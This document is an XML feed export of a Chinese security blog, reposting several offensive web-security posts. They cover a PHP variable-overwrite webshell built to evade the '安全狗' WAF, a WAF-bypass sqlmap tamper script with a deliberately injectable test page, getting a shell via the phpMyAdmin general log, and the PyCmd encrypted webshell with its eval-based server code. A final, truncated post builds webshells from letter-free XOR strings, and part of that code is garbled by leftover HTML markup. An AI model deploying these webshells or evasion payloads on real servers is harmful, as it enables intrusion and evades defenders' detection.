            
            <tag> 代码审计 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖漏洞学习及在webshell中的运用</title>
      <link href="2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"/>
      <url>2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、发生条件："><a href="#一、发生条件：" class="headerlink" title="一、发生条件："></a>一、发生条件：</h2><p>函数使用不当（$$、extract()、parse_str()、import_request_variables()等）<br>开启全局变量</p><h2 id="二、基础了解："><a href="#二、基础了解：" class="headerlink" title="二、基础了解："></a>二、基础了解：</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.$$定义"></a>1.$$定义</h3><p>$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。</p><p>举个简单例子：<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdad38e1.webp" alt=""><br>变量a被定义成了字符串hello 而变量$a被定于成了字符串world!<br>但同时$a本身也是个变量<br>$$a就可以代表两个含义$($a)和$(hello) 两个变量<br>此时输出的结果如图：<br><img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdad38a9.webp" alt=""></p><a id="more"></a><h3 id="2-extract-定义"><a href="#2-extract-定义" class="headerlink" title="2.extract()定义"></a>2.extract()定义</h3><p>extract()可以从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值<br>语法结构：extract(array,extract_rules,prefix)<br>i.array为必选参数（此参数必须为数组型数据）<br>ii.extract_rules为可选参数，可选的值有：<br>● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>iii.prefix为可选参数（此参数暂不解释）<br>举个例子：<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdadac53.webp" alt=""><br>在开头我们定义了一个数组d<br>然后我们使用extract()函数并将array参数填写为数组d<br>此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）<br>此时输出结果为：<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdadac1e.webp" alt=""><br>可以看到我们之前并未声明过a、b、c变量，但是仍可输出。</p><h3 id="3-parse-str-定义："><a href="#3-parse-str-定义：" class="headerlink" title="3.parse_str()定义："></a>3.parse_str()定义：</h3><p>把查询字符串解析到变量中<br>语法：parse_str(string,array)<br>string为必选参数<br>array为可选参数<br>举个例子<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdae279d.webp" alt=""><br>可以看到此函数将name和age初始化成了变量，且值为等号右边的值<br>当array参数存在时：<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdae96e7.webp" alt=""><br>4.import_request_varibles()定义<br>将 GET/POST/Cookie 变量导入到全局作用域中<br>此函数相当于开启全局变量注册<br>语法import_request_variables(string $types ,string $prefix )<br>第一个参数为必选<br>第二个参数为可选<br>例子：<br>import_request_variables(“GPC”)<br>使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册<br>当第二个参数存在时将会加上一个前缀</p><h2 id="三、经典案例"><a href="#三、经典案例" class="headerlink" title="三、经典案例"></a>三、经典案例</h2><h3 id="1-经典-变量覆盖"><a href="#1-经典-变量覆盖" class="headerlink" title="1.经典$$变量覆盖"></a>1.经典$$变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key &#x3D;&gt; $_value) &#123;</span><br><span class="line">        $$_key &#x3D; addslashes($_value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过<br>可以看出$_key为COOKIE POST GET中的参数<br>比如提交?a=1 则$_key的值为a<br>而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)<br>这样便会覆盖原有的变量a的值<br>我们来运行一下：<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdb04b50.webp" alt=""><br>可以看到变量a被我们覆盖掉了</p><h3 id="2-部分cms变量覆盖案例："><a href="#2-部分cms变量覆盖案例：" class="headerlink" title="2.部分cms变量覆盖案例："></a>2.部分cms变量覆盖案例：</h3><p>MetInfo全局变量覆盖另类突破防注入<br><a href="http://www.weixianmanbu.com/article/84.html">http://www.weixianmanbu.com/article/84.html</a><br>齐博CMS变量覆盖导致sql注入漏洞<br><a href="http://bobao.360.cn/learning/detail/291.html">http://bobao.360.cn/learning/detail/291.html</a><br>Destoon 20140530最新版超全局变量覆盖导致的安全问题<br><a href="http://0day5.com/archives/1855/">http://0day5.com/archives/1855/</a></p><h2 id="四、变量覆盖玩出新花样之一句话木马bypass某狗"><a href="#四、变量覆盖玩出新花样之一句话木马bypass某狗" class="headerlink" title="四、变量覆盖玩出新花样之一句话木马bypass某狗"></a>四、变量覆盖玩出新花样之一句话木马bypass某狗</h2><p>经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdb03b70.webp" alt=""></p><p>但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdb03bfc.webp" alt=""><br>这就值得我们思考了，为什么这样不会拦截呢？<br>我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马<br>那如果这时我们在联系一下变量覆盖漏洞呢？<br>在这里我选用了上面的案例代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key &#x3D;&gt; $_value) &#123;</span><br><span class="line">        $$_key &#x3D; addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把addslashes()删掉 然后把代码精简下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_POST&#39;) as $_r)&#123;foreach($$_r as $_k &#x3D;&gt; $_v) &#123;$$_k &#x3D; $_v;&#125;&#125;</span><br></pre></td></tr></table></figure><br>最终代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach(array(&#39;_POST&#39;) as $_r)&#123;foreach($$_r as $_k &#x3D;&gt; $_v) &#123;$$_k &#x3D; $_v;&#125;&#125;;assert($a);?&gt;</span><br></pre></td></tr></table></figure><br>成功bypass<br> <img src="https://img.0x002.com/article/VariableCoverInWebShell/5b426fdb06bb0.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇淫技巧 </tag>
            
            <tag> 过狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[转]绕过360,安全狗,D盾等进行Sql注入</title>
      <link href="2017/%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360,%E5%AE%89%E5%85%A8%E7%8B%97,D%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5/"/>
      <url>2017/%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360,%E5%AE%89%E5%85%A8%E7%8B%97,D%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="作者-Bypass"><a href="#作者-Bypass" class="headerlink" title="作者:Bypass"></a>作者:Bypass</h4><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a><strong>0x02 环境搭建</strong></h2><p>Windows Server 2003+phpStudy</p><p><img src="https://i.loli.net/2018/07/10/5b43c36bcac0f.png" alt=""></p><p>sql注入点测试代码：<br><a id="more"></a><br>sql.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con &#x3D; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">mysql_select_db(&quot;test&quot;, $con);</span><br><span class="line">$id &#x3D; $_REQUEST[ &#39;id&#39; ];</span><br><span class="line">$query  &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; $id &quot;;</span><br><span class="line">$result &#x3D; mysql_query($query);</span><br><span class="line">while($row &#x3D; mysql_fetch_array($result))</span><br><span class="line">  &#123;</span><br><span class="line">  echo $row[&#39;0&#39;] . &quot; &quot; . $row[&#39;1&#39;];</span><br><span class="line">  echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>运行效果：</p><p><img src="https://i.loli.net/2018/07/10/5b43c38abbd51.png" alt=""></p><h2 id="0x03-Bypass-过程"><a href="#0x03-Bypass-过程" class="headerlink" title="0x03 Bypass 过程"></a><strong>0x03 Bypass 过程</strong></h2><p>对不同waf做了一些尝试，关于SQL注入bypass，可以考虑划分为3种：</p><p>1、完全bypass（union select+select from）</p><p>2、部分bypass（union select 或select from）</p><p>3、获取一些敏感信息（如version()、database()等）</p><p><strong>A、Union+select</strong></p><p>先考虑如何绕过union+select，可以考虑一下几种形式</p><p>1、最常见形式 %20、+、/**/</p><p>2、Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0</p><p>3、内联注释   /!12345select/</p><p>通过组合测试，可以发现 union%0a/<em>!12345select</em>/ 1,2 可以绕过防御。</p><p><img src="https://i.loli.net/2018/07/10/5b43c3c49a497.png" alt=""></p><p>B、<strong>select+from</strong></p><p><strong>　　</strong>select+from 也可以通过同样的组合形式绕过防御。</p><p>至此已完全绕过union+select+from。</p><p><img src="https://i.loli.net/2018/07/10/5b43c3eccea2c.png" alt=""></p><h2 id="0x04-自动化注入"><a href="#0x04-自动化注入" class="headerlink" title="0x04 自动化注入"></a><strong>0x04 自动化注入</strong></h2><p>编写tamper bypass脚本，来利用sqlmap来跑数据</p><p>先看一下原始sqlmap的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u  http:&#x2F;&#x2F;192.168.106.130&#x2F;config&#x2F;sql.php?id&#x3D;1  --flush-session --dbs   失败</span><br></pre></td></tr></table></figure><br><img src="https://i.loli.net/2018/07/10/5b43c4069255b.png" alt=""></p><p>加载tamper脚本，可成功获取数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;192.168.106.130&#x2F;config&#x2F;sql.php?id&#x3D;1 --flush-session  --technique&#x3D;U --tamper&#x3D;&quot;360safe.py&quot; --dbs</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b43c4214f10f.png" alt=""></p><p>tamper脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">write by Aaron</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces keywords</span><br><span class="line">    &gt;&gt;&gt; tamper(&#39;UNION SELECT id FROM users&#39;)</span><br><span class="line">    &#39;union%0a&#x2F;*!12345select*&#x2F;id%0a&#x2F;*!12345from*&#x2F;users&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if payload:</span><br><span class="line">        payload&#x3D;payload.replace(&quot; ALL SELECT &quot;,&quot;%0a&#x2F;*!12345select*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a&#x2F;*!12345select*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot; FROM &quot;,&quot;%0a&#x2F;*!12345from*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CAST(&quot;,&quot;&#x2F;*!12345CASt(*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;)</span><br><span class="line"></span><br><span class="line">    return payload&lt;&#x2F;pre&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class&#x3D;&quot;cnblogs_code_copy&quot;&gt;&lt;a title&#x3D;&quot;复制代码&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><br>这边主要是针对union select查询进行的关键字替换，测试过程中，可以发现利用tamper脚本来bypass的弊端，sqlmap的部分payload是固定的，部分关键字会被waf拦截，需要一步步调试，总结，测试哪些关键字是被拦截的，如何绕过关键字的检测等，还是挺麻烦。</p><h2 id="0x05-END"><a href="#0x05-END" class="headerlink" title="0x05 END"></a><strong>0x05 END</strong></h2><p>最好的自动化注入工具：可以考虑自己编写一个自动化注入工具，灵活的自定义payload来获取数据库信息。</p><p>目前的测试成果，可成功bypass注入防御，如 安全狗、云锁、360主机卫士、D盾_IIS防火墙等主机防护软件及各种云waf，有些姿势都在用。</p><p>原文链接：<a href="https://www.cnblogs.com/xiaozi/p/7275134.html">https://www.cnblogs.com/xiaozi/p/7275134.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 奇淫技巧 </tag>
            
            <tag> D盾 </tag>
            
            <tag> 过狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[转]phpmyadmin日志拿shell</title>
      <link href="2017/%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell/"/>
      <url>2017/%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell/</url>
      
        <content type="html"><![CDATA[<h4 id="作者：珍惜少年时"><a href="#作者：珍惜少年时" class="headerlink" title="作者：珍惜少年时"></a>作者：珍惜少年时</h4><h2 id="前提：条件是root用户。"><a href="#前提：条件是root用户。" class="headerlink" title="前提：条件是root用户。"></a><strong>前提：</strong>条件是root用户。</h2><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！</p><p>要先把general log设置为ON</p><a id="more"></a><p><img src="https://img.0x002.com/article/phpmyadmin/5b43c4bac2fe0.webp" alt=""></p><p>然后将文件修改日志文件名修改。</p><p><img src="https://img.0x002.com/article/phpmyadmin/5b43c4d204d5d.webp" alt=""></p><p>本来是在mysql下的一个log日志文件的，我重新改到了phpstudy目录下然后命名为def2.php</p><p>然后随便执行一条sql语句。</p><p><img src="https://img.0x002.com/article/phpmyadmin/5b43c4ed0b163.webp" alt=""></p><p>菜刀连接之。</p><p><img src="https://img.0x002.com/article/phpmyadmin/5b43c506286db.webp" alt=""></p><p>原文链接：<a href="https://www.cnblogs.com/xishaonian/p/6622818.html">https://www.cnblogs.com/xishaonian/p/6622818.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpmyadmin </tag>
            
            <tag> 奇淫技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[转]利用PyCmd加密隐形木马，成功绕过D盾</title>
      <link href="2017/%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE/"/>
      <url>2017/%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<h4 id="作者：nmask"><a href="#作者：nmask" class="headerlink" title="作者：nmask"></a>作者：nmask</h4><hr><p><strong>之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href="http://www.kongdewei.cn/">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。</strong></p><h2 id="PyCmd适用环境"><a href="#PyCmd适用环境" class="headerlink" title="PyCmd适用环境"></a>PyCmd适用环境</h2><p>当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。</p><h2 id="PyCmd使用"><a href="#PyCmd使用" class="headerlink" title="PyCmd使用"></a>PyCmd使用</h2><p>我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。</p><a id="more"></a><p>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p><p>php网站木马地址：10.0.3.13/test/p.php</p><p>jsp网站木马地址：192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp</p><p>查看shell的情况：</p><p><img src="http://image.3001.net/images/20170714/15000049747112.png" alt="浅析PyCmd加密隐形木马"></p><p>此时，运行PyCmd.py程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http:&#x2F;&#x2F;10.0.3.13&#x2F;test&#x2F;p.php -p test [--proxy]</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http:&#x2F;&#x2F;192.168.10.149:8080&#x2F;headgmp&#x2F;upload&#x2F;2017_07_13&#x2F;11.jsp -p test [--proxy]</span><br></pre></td></tr></table></figure></p><p><img src="http://image.3001.net/images/20170714/15000049277207.png" alt="浅析PyCmd加密隐形木马"></p><p>程序会自动判断输入的网站类型，这里是jsp类型的网站。</p><p>运行程序可输入以下参数：</p><blockquote><p>-h 查看帮助信息</p><p>-u 网站木马地址</p><p>-p 木马shell密码</p><p>–proxy 开启本地代理（方便调试）<br>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p></blockquote><h2 id="PyCmd数据加密"><a href="#PyCmd数据加密" class="headerlink" title="PyCmd数据加密"></a>PyCmd数据加密</h2><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。</p><p>当执行cmd命令时，通过Fiddler抓包查看数据：</p><p><img src="http://image.3001.net/images/20170717/15002739431723.png" alt="浅析PyCmd加密隐形木马"></p><p>查看回报信息：</p><p><img src="http://image.3001.net/images/20170717/15002739773897.png" alt="浅析PyCmd加密隐形木马"></p><h2 id="PyCmd木马隐身"><a href="#PyCmd木马隐身" class="headerlink" title="PyCmd木马隐身"></a>PyCmd木马隐身</h2><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀（2016.9.18日检测结果）</p><p>这里演示php木马查杀：</p><blockquote><p>&lt;?php</p><p>$string=”;</p><p>$password=’test’;</p><p>if(isset($_POST[$password])){</p><p>$hex=$_POST[$password];</p><p>for($i=0;$i&lt;strlen($hex)-1;$i+=2){</p><p>$string.=chr(hexdec($hex[$i].$hex[$i+1]));</p><p>}</p><p>@eval($string);</p><p>}else{</p><p>echo “This is a Test!”;</p><p>}</p><p>?&gt;</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a><img src="http://image.3001.net/images/20170717/15002740265116.png" alt="PyCmd 加密隐形木马"></h3><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>PyCmd <a href="https://github.com/tengzhangchao/PyCmd">下载地址</a></p><p>项目地址：<a href="https://github.com/tengzhangchao/PyCmd">https://github.com/tengzhangchao/PyCmd</a></p><p>说明：绕过防火墙检测的方法很多，这里只是提供了一种思路，pycmd是我去年写的一款工具，最近打算完善其功能，代码已经开源。</p><p>原文连接：<a href="https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/">https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/</a></p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇淫技巧 </tag>
            
            <tag> webshell </tag>
            
            <tag> D盾 </tag>
            
            <tag> 过狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[转]一些不包含数字和字母的webshell</title>
      <link href="2017/%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
      <url>2017/%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</url>
      
        <content type="html"><![CDATA[<h4 id="作者：离别歌"><a href="#作者：离别歌" class="headerlink" title="作者：离别歌"></a>作者：离别歌</h4><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么，这个代码如何利用？</p><a id="more"></a><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$=(&#x27;%01&#x27;^&#x27;&#x27;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;%13&#x27;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;&#x27;).(&#x27;%13&#x27;^&#x27;&#x27;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;%05&#x27;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;&#x27;).(&#x27;%12&#x27;^&#x27;&#x27;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;%14&#x27;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#x27;&#x27;); // $=&#x27;assert&#x27;;</span><br><span class="line">$=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $=&#x27;POST&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=$$;</span><br><span class="line">$($[_]); <span class="comment">// assert($POST[]);</span></span><br></pre></td></tr></table></figure><br>执行结果如下：</p><p><img 